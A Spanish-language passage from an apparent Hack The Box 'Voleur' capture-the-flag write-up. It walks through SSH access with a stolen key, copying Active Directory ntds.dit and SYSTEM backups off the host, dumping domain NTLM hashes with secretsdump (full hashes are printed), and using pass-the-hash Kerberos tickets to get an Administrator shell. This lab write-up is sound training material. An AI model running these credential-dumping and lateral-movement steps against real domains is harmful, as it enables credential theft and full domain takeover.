Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 16:09:59 2025 ..
drw-rw-rw-          0  Thu Jan 30 13:11:29 2025 Third-Line Support
# tree .
/Third-Line Support/id_rsa
/Third-Line Support/Note.txt.txt
Finished - 3 files and folders
~~~

Descargaremos estos dos archivos en nuestro directorio de trabajo

```
# get /Third-Line Support/id_rsa
# get /Third-Line Support/Note.txt.txt
```

Si leemos la nota nos deja una pista clara, debemos conectarnos con la clave privada al DC, y como se usa `WSL`, podemos intentar conectarnos por SSH en el puerto `2222`

``` bash
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

> WSL (`Windows Subsystem for Linux`) es una característica de Windows que permite ejecutar un entorno Linux directamente en la computadora con Windows, sin necesidad de una máquina virtual separada o de arrancar el sistema de forma dual.
{: .notice--info}

Intentando conectarnos con algunos usuarios de servicio, tendremos éxito con la cuenta `svc_backup`

``` bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 svc_backup@dc.voleur.htb

Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd
   ...done.

svc_backup@DC:~$ id
uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
svc_backup@DC:~$ 
svc_backup@DC:~$ export TERM=xterm # Limpiar con Ctrl+L
```

### Host's Files
 
Dentro del siguiente [`FAQ`](https://learn.microsoft.com/es-es/windows/wsl/faq#-qu--puedo-hacer-con-wsl-), se menciona que podemos acceder al sistema de archivos del equipo Windows desde la ruta `/mnt`, por ejemplo, el disco `C:` se monta en `/mnt/c`.

``` bash
svc_backup@DC:~$ ls -l /mnt/c

ls: /mnt/c/Config.Msi: Permission denied
ls: cannot access '/mnt/c/DumpStack.log.tmp': Permission denied
ls: cannot access '/mnt/c/pagefile.sys': Permission denied
ls: /mnt/c/PerfLogs: Permission denied
ls: '/mnt/c/System Volume Information': Permission denied
total 0
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025 '$Recycle.Bin'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun 30 14:08 '$WinREAgent'
d--x--x--x 1 svc_backup svc_backup 4096 Jul 24 13:16  Config.Msi
lrwxrwxrwx 1 svc_backup svc_backup   12 Jan 28  2025 'Documents and Settings' -> /mnt/c/Users
-????????? ? ?          ?             ?            ?  DumpStack.log.tmp
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29  2025  Finance
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29  2025  HR
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29  2025  IT
d--x--x--x 1 svc_backup svc_backup 4096 May  8  2021  PerfLogs
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jul 24 13:10 'Program Files'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025 'Program Files (x86)'
drwxrwxrwx 1 svc_backup svc_backup 4096 Nov  9 21:05  ProgramData
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 28  2025  Recovery
d--x--x--x 1 svc_backup svc_backup 4096 Jan 30  2025 'System Volume Information'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025  Users
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun  5 12:53  Windows
dr-xr-xr-x 1 svc_backup svc_backup 4096 May 29 15:07  inetpub
-????????? ? ?          ?             ?            ?  pagefile.sys
```

Recordemos que dentro de la carpeta `IT/Third-Line Support` teníamos una sub-carpeta `Backups` a la que no teníamos acceso en primera instancia

``` bash
svc_backup@DC:~$ ls -la "/mnt/c/IT/Third-Line Support/Backups"
total 0
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  .
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025  ..
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025 'Active Directory'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  registry
```


## Credential Dumping: NTDS

Dentro del directorio `Active Directory`, encontraremos un archivo `ntds.dit`

> El archivo **NTDS.DIT** (`New Technology Directory Services Information Tree`) es la **base de datos central** de los **Servicios de Dominio de Active Directory (AD DS)** en los controladores de dominio de Windows Server. Contiene las credenciales de toda la información de AD.
{: .notice--info}

``` bash
svc_backup@DC:~$ ls "/mnt/c/IT/Third-Line Support/Backups/Active Directory"
ntds.dit  ntds.jfm
```

Si listamos el otro directorio, veremos los archivos `SECURITY` y `SYSTEM`.

> Con el archivo `SYSTEM` y `ntds.dit` a nuestra disposición, podemos realizar un volcado de todas las credenciales del dominio en formato de hashes NTLM
{: .notice--danger}

Para agilizar un poco la transferencia de archivos, podemos comprimir los recursos necesarios y copiarlos con la herramienta `scp`

~~~ bash
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ tar -cf backup.tar.gz registry/SYSTEM Active\ Directory/ntds.dit

svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ mv backup.tar.gz /tmp
~~~

Podemos copiar rápidamente hacia nuestra máquina con la ayuda de la herramienta `scp` de la siguiente manera

~~~ bash
scp -P 2222 -i id_rsa -r "svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups/backup.tar.gz" .
~~~

Extraemos el archivo comprimido que creamos

``` bash
tar -xf backup.tar.gz 
```

Con la herramienta `secretsdump` haremos un volcado de hashes, veremos todos los hashes NTLM de todos los usuarios del dominio

~~~ bash
secretsdump.py local -ntds Active\ Directory/ntds.dit -system registry/SYSTEM
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e65...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
...
<SNIP>
...
~~~


## Root Time

Como NTLM se encuentra deshabilitado, debemos una vez más, solicitar un TGT para conectarnos al dominio

~~~ bash
getTGT.py voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip DC01.voleur.htb

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
~~~

Al igual que al conectarnos anteriormente, podemos emplear la variable `KRB5CCNAME` directamente en vez de exportarla

~~~ bash
KRB5CCNAME=Administrator.ccache evil-winrm-py -i dc.voleur.htb -k --no-pass
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc.voleur.htb:5985' as 'Administrator@VOLEUR.HTB'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
voleur\administrator
~~~

Ya podremos ver la última flag ubicada en el escritorio del usuario `Administrator`

~~~ bash
evil-winrm-py PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt 
49d...
~~~

Gracias por leer, a continuación te dejo la cita del día.

> Thousands of candles can be lighted from a single candle, and the life of the candle will not be shortened. Happiness never decreases by being shared.
> — Buddha